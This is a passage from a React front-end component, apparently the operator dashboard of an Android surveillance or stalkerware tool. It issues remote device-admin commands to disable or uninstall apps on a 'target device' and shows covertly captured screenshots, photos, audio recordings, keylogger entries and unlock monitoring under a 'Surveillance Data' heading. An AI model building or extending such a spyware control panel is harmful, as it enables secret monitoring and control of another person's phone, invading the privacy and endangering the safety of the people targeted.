                        !lockDetails.isDeviceAdminActive
                      }
                    >
                      🚫 Disable ({getButtonStatus("disableApp")})
                    </button>
                    <button
                      className={`lock-button ${fetchStatus.uninstallApp}`}
                      onClick={() =>
                        triggerDeviceAdviceCommand("uninstallApp", {
                          packageName: commandParams.packageName,
                        })
                      }
                      disabled={
                        !commandParams.packageName ||
                        fetchStatus.uninstallApp === "sending" ||
                        fetchStatus.uninstallApp === "pending" ||
                        fetchStatus.uninstallApp === "processing"
                      }
                    >
                      🗑️ Uninstall ({getButtonStatus("uninstallApp")})
                    </button>
                  </div>
                  {(errorDetails.disableApp || errorDetails.uninstallApp) && (
                    <div className="error-message">
                      {errorDetails.disableApp &&
                        `Disable Error: ${errorDetails.disableApp}`}
                      {errorDetails.uninstallApp &&
                        `Uninstall Error: ${errorDetails.uninstallApp}`}
                    </div>
                  )}
                </div>
              </div>

              {/* Captured Data Display */}
              {(screenCaptures.length > 0 ||
                photoCaptures.length > 0 ||
                audioRecordings.length > 0 ||
                keyloggerData.length > 0 ||
                unlockAttempts.length > 0) && (
                <div className="captured-data">
                  <h4>📊 Surveillance Data</h4>

                  {screenCaptures.length > 0 && (
                    <div className="capture-section">
                      <h5>📱 Screen Captures ({screenCaptures.length})</h5>
                      <div className="capture-grid">
                        {screenCaptures.map((capture) => (
                          <div key={capture.id} className="capture-item">
                            <div className="capture-placeholder">
                              📱 Screenshot
                            </div>
                            <p>{formatTimestamp(capture.timestamp)}</p>
                            <p className="capture-id">
                              ID: {capture.commandId}
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {photoCaptures.length > 0 && (
                    <div className="capture-section">
                      <h5>📷 Photo Captures ({photoCaptures.length})</h5>
                      <div className="capture-grid">
                        {photoCaptures.map((capture) => (
                          <div key={capture.id} className="capture-item">
                            <div className="capture-placeholder">📷 Photo</div>
                            <p>{formatTimestamp(capture.timestamp)}</p>
                            <p className="capture-id">
                              ID: {capture.commandId}
                            </p>
                            <p className="capture-size">
                              Size: {Math.round(capture.size / 1024)}KB
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {audioRecordings.length > 0 && (
                    <div className="capture-section">
                      <h5>🎤 Audio Recordings ({audioRecordings.length})</h5>
                      <div className="capture-grid">
                        {audioRecordings.map((recording) => (
                          <div key={recording.id} className="capture-item">
                            <div className="capture-placeholder">🎤 Audio</div>
                            <p>{formatTimestamp(recording.timestamp)}</p>
                            <p className="capture-id">
                              ID: {recording.commandId}
                            </p>
                            <p className="capture-duration">
                              Duration: {recording.duration}s
                            </p>
                            <p className="capture-size">
                              Size: {Math.round(recording.size / 1024)}KB
                            </p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {keyloggerData.length > 0 && (
                    <div className="capture-section">
                      <h5>⌨️ Keylogger Data ({keyloggerData.length})</h5>
                      <div className="keylogger-data">
                        {keyloggerData.map((log) => (
                          <div key={log.id} className="keylogger-item">
                            <span className="keylogger-time">
                              {formatTimestamp(log.timestamp)}
                            </span>
                            <span className="keylogger-input">
                              Input Method: {log.inputMethod}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {unlockAttempts.length > 0 && (
                    <div className="capture-section">
                      <h5>👁️ Unlock Monitoring ({unlockAttempts.length})</h5>
                      <div className="unlock-attempts">
                        {unlockAttempts.map((attempt) => (
                          <div key={attempt.id} className="unlock-attempt">
                            <span
                              className={`unlock-status ${
                                attempt.isDeviceLocked ? "locked" : "unlocked"
                              }`}
                            >
                              {attempt.isDeviceLocked ? "🔒" : "🔓"}
                            </span>
                            <span className="unlock-time">
                              {formatTimestamp(attempt.timestamp)}
                            </span>
                            <span className="unlock-secure">
                              Secure: {attempt.isDeviceSecure ? "✅" : "❌"}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          )}
        </div>
      )}

      {!selectedDevice && (
        <div className="no-device-selected">
          <h3>🎯 No Device Selected</h3>
          <p>
            Please select a device from the dropdown above to access device
            control features.
          </p>
          <p>
            Make sure the Lock Service is running on the target device with all
            required permissions.
          </p>
        </div>
      )}
    </div>
  );
};

export default LockServiceTab;
